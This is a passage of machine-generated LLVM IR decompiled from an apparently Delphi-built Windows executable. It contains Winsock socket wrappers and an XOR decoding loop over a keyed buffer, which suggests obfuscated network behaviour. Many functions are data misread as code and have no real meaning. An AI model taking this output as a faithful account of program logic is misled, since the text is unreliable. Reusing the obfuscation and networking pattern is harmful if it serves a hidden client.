  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404810:
  %esi.2.reg2mem = alloca i32, !insn.addr !322
  %esp.0.reg2mem = alloca i32, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %5 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %6 = add i32 %1, 117, !insn.addr !322
  %7 = inttoptr i32 %6 to i32*, !insn.addr !322
  %8 = load i32, i32* %7, align 4, !insn.addr !322
  %9 = mul i32 %8, 808467313, !insn.addr !322
  br i1 %5, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %10 = xor i32 %9, %3, !insn.addr !324
  %11 = trunc i32 %3 to i16, !insn.addr !325
  %12 = call i32 @__readfsdword(i32 %10), !insn.addr !325
  call void @__asm_outsd(i16 %11, i32 %12), !insn.addr !325
  %13 = add i32 %0, 106, !insn.addr !326
  %14 = add i32 %13, %2, !insn.addr !326
  %15 = and i32 %14, 65535
  %16 = inttoptr i32 %15 to i64*, !insn.addr !326
  %17 = load i64, i64* %16, align 4, !insn.addr !326
  %18 = call i32 @__asm_bound(i64 %17), !insn.addr !326
  %19 = inttoptr i32 %10 to i32*, !insn.addr !327
  %20 = load i32, i32* %19, align 4, !insn.addr !327
  call void @__asm_outsd(i16 %11, i32 %20), !insn.addr !327
  %21 = bitcast i32* %eax to i8*
  %22 = load i8, i8* %21, align 4, !insn.addr !328
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !328
  %25 = add i8 %22, %24, !insn.addr !328
  %26 = inttoptr i32 %23 to i8*, !insn.addr !328
  store i8 %25, i8* %26, align 1, !insn.addr !328
  %27 = load i8, i8* %21, align 4, !insn.addr !329
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !329
  %30 = add i8 %27, %29, !insn.addr !329
  %31 = inttoptr i32 %28 to i8*, !insn.addr !329
  store i8 %30, i8* %31, align 1, !insn.addr !329
  %32 = load i8, i8* %21, align 4, !insn.addr !330
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !330
  %35 = add i8 %32, %34, !insn.addr !330
  %36 = inttoptr i32 %33 to i8*, !insn.addr !330
  store i8 %35, i8* %36, align 1, !insn.addr !330
  %37 = load i8, i8* %21, align 4, !insn.addr !331
  %38 = load i32, i32* %eax, align 4
  %39 = trunc i32 %38 to i8, !insn.addr !331
  %40 = add i8 %37, %39, !insn.addr !331
  %41 = inttoptr i32 %38 to i8*, !insn.addr !331
  store i8 %40, i8* %41, align 1, !insn.addr !331
  %42 = load i8, i8* %21, align 4, !insn.addr !332
  %43 = load i32, i32* %eax, align 4
  %44 = trunc i32 %43 to i8, !insn.addr !332
  %45 = add i8 %42, %44, !insn.addr !332
  %46 = inttoptr i32 %43 to i8*, !insn.addr !332
  store i8 %45, i8* %46, align 1, !insn.addr !332
  %47 = load i8, i8* %21, align 4, !insn.addr !333
  %48 = load i32, i32* %eax, align 4
  %49 = trunc i32 %48 to i8, !insn.addr !333
  %50 = add i8 %47, %49, !insn.addr !333
  %51 = inttoptr i32 %48 to i8*, !insn.addr !333
  store i8 %50, i8* %51, align 1, !insn.addr !333
  %52 = load i8, i8* %21, align 4, !insn.addr !334
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !334
  %55 = add i8 %52, %54, !insn.addr !334
  %56 = inttoptr i32 %53 to i8*, !insn.addr !334
  store i8 %55, i8* %56, align 1, !insn.addr !334
  %57 = load i8, i8* %21, align 4, !insn.addr !335
  %58 = load i32, i32* %eax, align 4
  %59 = trunc i32 %58 to i8, !insn.addr !335
  %60 = add i8 %57, %59, !insn.addr !335
  %61 = inttoptr i32 %58 to i8*, !insn.addr !335
  store i8 %60, i8* %61, align 1, !insn.addr !335
  %62 = load i8, i8* %21, align 4, !insn.addr !336
  %63 = load i32, i32* %eax, align 4
  %64 = trunc i32 %63 to i8, !insn.addr !336
  %65 = add i8 %62, %64, !insn.addr !336
  %66 = inttoptr i32 %63 to i8*, !insn.addr !336
  store i8 %65, i8* %66, align 1, !insn.addr !336
  %67 = load i8, i8* %21, align 4, !insn.addr !337
  %68 = load i32, i32* %eax, align 4
  %69 = trunc i32 %68 to i8, !insn.addr !337
  %70 = add i8 %67, %69, !insn.addr !337
  %71 = inttoptr i32 %68 to i8*, !insn.addr !337
  store i8 %70, i8* %71, align 1, !insn.addr !337
  %72 = load i8, i8* %21, align 4, !insn.addr !338
  %73 = load i32, i32* %eax, align 4
  %74 = trunc i32 %73 to i8, !insn.addr !338
  %75 = add i8 %72, %74, !insn.addr !338
  %76 = inttoptr i32 %73 to i8*, !insn.addr !338
  store i8 %75, i8* %76, align 1, !insn.addr !338
  %77 = load i8, i8* %21, align 4, !insn.addr !339
  %78 = load i32, i32* %eax, align 4
  %79 = trunc i32 %78 to i8, !insn.addr !339
  %80 = add i8 %77, %79, !insn.addr !339
  %81 = inttoptr i32 %78 to i8*, !insn.addr !339
  store i8 %80, i8* %81, align 1, !insn.addr !339
  %82 = load i8, i8* %21, align 4, !insn.addr !340
  %83 = load i32, i32* %eax, align 4
  %84 = trunc i32 %83 to i8, !insn.addr !340
  %85 = add i8 %82, %84, !insn.addr !340
  %86 = inttoptr i32 %83 to i8*, !insn.addr !340
  store i8 %85, i8* %86, align 1, !insn.addr !340
  %87 = load i8, i8* %21, align 4, !insn.addr !341
  %88 = load i32, i32* %eax, align 4
  %89 = trunc i32 %88 to i8, !insn.addr !341
  %90 = add i8 %87, %89, !insn.addr !341
  %91 = inttoptr i32 %88 to i8*, !insn.addr !341
  store i8 %90, i8* %91, align 1, !insn.addr !341
  %92 = load i8, i8* %21, align 4, !insn.addr !342
  %93 = load i32, i32* %eax, align 4
  %94 = trunc i32 %93 to i8, !insn.addr !342
  %95 = add i8 %92, %94, !insn.addr !342
  %96 = inttoptr i32 %93 to i8*, !insn.addr !342
  store i8 %95, i8* %96, align 1, !insn.addr !342
  %97 = load i8, i8* %21, align 4, !insn.addr !343
  %98 = load i32, i32* %eax, align 4
  %99 = trunc i32 %98 to i8, !insn.addr !343
  %100 = add i8 %97, %99, !insn.addr !343
  %101 = inttoptr i32 %98 to i8*, !insn.addr !343
  store i8 %100, i8* %101, align 1, !insn.addr !343
  %102 = load i8, i8* %21, align 4, !insn.addr !344
  %103 = load i32, i32* %eax, align 4
  %104 = trunc i32 %103 to i8, !insn.addr !344
  %105 = add i8 %102, %104, !insn.addr !344
  %106 = inttoptr i32 %103 to i8*, !insn.addr !344
  store i8 %105, i8* %106, align 1, !insn.addr !344
  %107 = load i8, i8* %21, align 4, !insn.addr !345
  %108 = load i32, i32* %eax, align 4
  %109 = trunc i32 %108 to i8, !insn.addr !345
  %110 = add i8 %107, %109, !insn.addr !345
  %111 = inttoptr i32 %108 to i8*, !insn.addr !345
  store i8 %110, i8* %111, align 1, !insn.addr !345
  %112 = load i8, i8* %21, align 4, !insn.addr !346
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !346
  %115 = add i8 %112, %114, !insn.addr !346
  %116 = inttoptr i32 %113 to i8*, !insn.addr !346
  store i8 %115, i8* %116, align 1, !insn.addr !346
  %117 = load i32, i32* %eax, align 4, !insn.addr !346
  ret i32 %117, !insn.addr !346

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %118 = load i32, i32* %eax, align 4
  %119 = inttoptr i32 %118 to i8*, !insn.addr !347
  %120 = load i8, i8* %119, align 1, !insn.addr !347
  %121 = trunc i32 %118 to i8, !insn.addr !347
  %122 = add i8 %120, %121, !insn.addr !347
  store i8 %122, i8* %119, align 1, !insn.addr !347
  %123 = load i32, i32* %eax, align 4
  %124 = inttoptr i32 %123 to i8*, !insn.addr !348
  %125 = load i8, i8* %124, align 1, !insn.addr !348
  %126 = trunc i32 %123 to i8, !insn.addr !348
  %127 = add i8 %125, %126, !insn.addr !348
  store i8 %127, i8* %124, align 1, !insn.addr !348
  %128 = load i32, i32* %eax, align 4
  %129 = inttoptr i32 %128 to i8*, !insn.addr !349
  %130 = load i8, i8* %129, align 1, !insn.addr !349
  %131 = trunc i32 %128 to i8, !insn.addr !349
  %132 = add i8 %130, %131, !insn.addr !349
  store i8 %132, i8* %129, align 1, !insn.addr !349
  %133 = mul i32 %1, 2, !insn.addr !350
  %134 = add i32 %133, 102, !insn.addr !350
  %135 = add i32 %134, %4, !insn.addr !350
  %136 = inttoptr i32 %135 to i8*, !insn.addr !350
  %137 = load i8, i8* %136, align 1, !insn.addr !350
  %138 = load i32, i32* %eax, align 4, !insn.addr !350
  %139 = udiv i32 %138, 256, !insn.addr !350
  %140 = trunc i32 %139 to i8, !insn.addr !350
  %141 = add i8 %137, %140, !insn.addr !350
  %142 = call i8 @llvm.ctpop.i8(i8 %141), !range !351, !insn.addr !350
  %143 = and i8 %142, 1, !insn.addr !350
  %144 = icmp eq i8 %143, 0, !insn.addr !350
  store i8 %141, i8* %136, align 1, !insn.addr !350
  %145 = trunc i32 %3 to i16, !insn.addr !352
  %146 = inttoptr i32 %9 to i32*, !insn.addr !352
  %147 = load i32, i32* %146, align 4, !insn.addr !352
  call void @__asm_outsd(i16 %145, i32 %147), !insn.addr !352
  %148 = icmp eq i1 %144, false, !insn.addr !353
  store i32 %9, i32* %esi.2.reg2mem, !insn.addr !353
  br i1 %148, label %dec_label_pc_404907, label %dec_label_pc_40489e, !insn.addr !353

dec_label_pc_40489e:                              ; preds = %dec_label_pc_404891
  %149 = load i32, i32* %eax, align 4, !insn.addr !354
  %150 = add i32 %149, 52, !insn.addr !354
  %151 = inttoptr i32 %150 to i64*, !insn.addr !354
  %152 = load i64, i64* %151, align 4, !insn.addr !354
  %153 = call i32 @__asm_bound(i64 %152), !insn.addr !354
  %154 = load i32, i32* %eax, align 4
  %155 = xor i32 %154, 52, !insn.addr !355
  store i32 %155, i32* %eax, align 4, !insn.addr !355
  %156 = xor i32 %153, %3, !insn.addr !356
  %157 = call i32 @__readfsdword(i32 %156), !insn.addr !357
  call void @__asm_outsd(i16 %145, i32 %157), !insn.addr !357
  %158 = inttoptr i32 %155 to i8*, !insn.addr !358
  %159 = load i8, i8* %158, align 1, !insn.addr !358
  %160 = trunc i32 %155 to i8, !insn.addr !358
  %factor = mul i8 %160, 11
  %161 = add i8 %159, %factor, !insn.addr !359
  store i8 %161, i8* %158, align 1, !insn.addr !359
  %162 = load i32, i32* %eax, align 4
  %163 = inttoptr i32 %162 to i8*, !insn.addr !360
  %164 = load i8, i8* %163, align 1, !insn.addr !360
  %165 = trunc i32 %162 to i8, !insn.addr !360
  %166 = add i8 %164, %165, !insn.addr !360
  store i8 %166, i8* %163, align 1, !insn.addr !360
  %167 = load i32, i32* %eax, align 4
  %168 = inttoptr i32 %167 to i8*, !insn.addr !361
  %169 = load i8, i8* %168, align 1, !insn.addr !361
  %170 = trunc i32 %167 to i8, !insn.addr !361
  %171 = add i8 %169, %170, !insn.addr !361
  store i8 %171, i8* %168, align 1, !insn.addr !361
  %172 = load i32, i32* %eax, align 4
  %173 = inttoptr i32 %172 to i8*, !insn.addr !362
  %174 = load i8, i8* %173, align 1, !insn.addr !362
  %175 = trunc i32 %172 to i8, !insn.addr !362
  %176 = add i8 %174, %175, !insn.addr !362
  store i8 %176, i8* %173, align 1, !insn.addr !362
  %177 = load i32, i32* %eax, align 4
  %178 = inttoptr i32 %177 to i8*, !insn.addr !363
  %179 = load i8, i8* %178, align 1, !insn.addr !363
  %180 = trunc i32 %177 to i8, !insn.addr !363
  %181 = add i8 %179, %180, !insn.addr !363
  store i8 %181, i8* %178, align 1, !insn.addr !363
  %182 = load i32, i32* %eax, align 4
  %183 = inttoptr i32 %182 to i8*, !insn.addr !364
  %184 = load i8, i8* %183, align 1, !insn.addr !364
  %185 = trunc i32 %182 to i8, !insn.addr !364
  %186 = add i8 %184, %185, !insn.addr !364
  store i8 %186, i8* %183, align 1, !insn.addr !364
  %187 = load i32, i32* %eax, align 4
  %188 = inttoptr i32 %187 to i8*, !insn.addr !365
  %189 = load i8, i8* %188, align 1, !insn.addr !365
  %190 = trunc i32 %187 to i8, !insn.addr !365
  %191 = add i8 %189, %190, !insn.addr !365
  store i8 %191, i8* %188, align 1, !insn.addr !365
  %192 = load i32, i32* %eax, align 4
  %193 = inttoptr i32 %192 to i8*, !insn.addr !366
  %194 = load i8, i8* %193, align 1, !insn.addr !366
  %195 = trunc i32 %192 to i8, !insn.addr !366
  %196 = add i8 %194, %195, !insn.addr !366
  store i8 %196, i8* %193, align 1, !insn.addr !366
  %197 = load i32, i32* %eax, align 4
  %198 = inttoptr i32 %197 to i8*, !insn.addr !367
  %199 = load i8, i8* %198, align 1, !insn.addr !367
  %200 = trunc i32 %197 to i8, !insn.addr !367
  %201 = add i8 %199, %200, !insn.addr !367
  store i8 %201, i8* %198, align 1, !insn.addr !367
